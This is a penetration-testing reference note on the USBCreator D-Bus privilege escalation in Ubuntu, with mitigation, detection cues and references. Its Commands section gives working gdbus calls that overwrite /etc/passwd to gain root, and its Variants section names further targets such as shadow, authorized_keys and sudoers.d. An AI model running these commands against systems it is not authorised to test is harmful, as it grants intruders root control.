---
topic: USBCreator — arbitrary write over D-Bus
tags: [linux, dbus, usbcreator, polkit, arbitrary-write, privesc]
---

# USBCreator — arbitrary write over D-Bus

**English** | [🌐 Español](usbcreator-dbus-arbitrary-write.md)

## Concept

The `com.ubuntu.USBCreator` service exposes the `Image` method, which copies an image to a destination. Affected versions do not validate the destination and let a sudo-group user copy arbitrary files as root without a password.

## When it applies

- The user is in the sudo group or a Polkit-authorized group.
- USBCreator is installed and the D-Bus service is active.
- You can call `gdbus` or `dbus-send`.

## Procedure

1. Confirm the interface with `gdbus introspect`.
2. Prepare a modified `/etc/passwd` or `/etc/shadow`.
3. Copy it with `Image` to the real destination.
4. Log in with `su` using the created account.

## Commands

```bash
gdbus introspect --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator
gdbus call --system --dest com.ubuntu.USBCreator \
  --object-path /com/ubuntu/USBCreator \
  --method com.ubuntu.USBCreator.Image /dev/shm/passwd /etc/passwd true
su <USER>
```

## Variants

- Copy `/etc/shadow` with a known hash.
- Overwrite root's `authorized_keys`.
- Write a file in `/etc/sudoers.d`.

## Limitations

- The service may be patched.
- Polkit may require authentication.
- The user must be in the allowed group.

## Mitigation

- Update USBCreator and validate destinations.
- Restrict the D-Bus interface and Polkit.
- Do not grant sudo to users who do not need it.

## Detection

- `USBCreator.Image` calls outside installation.
- Changes to `/etc/passwd` or `/etc/shadow`.
- New UID 0 accounts.

## References

- [0xdf — Passage](https://0xdf.gitlab.io/2021/03/06/htb-passage.html)
- [Unit 42 — USBCreator](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [D-Bus — specification](https://www.freedesktop.org/wiki/Software/dbus/)
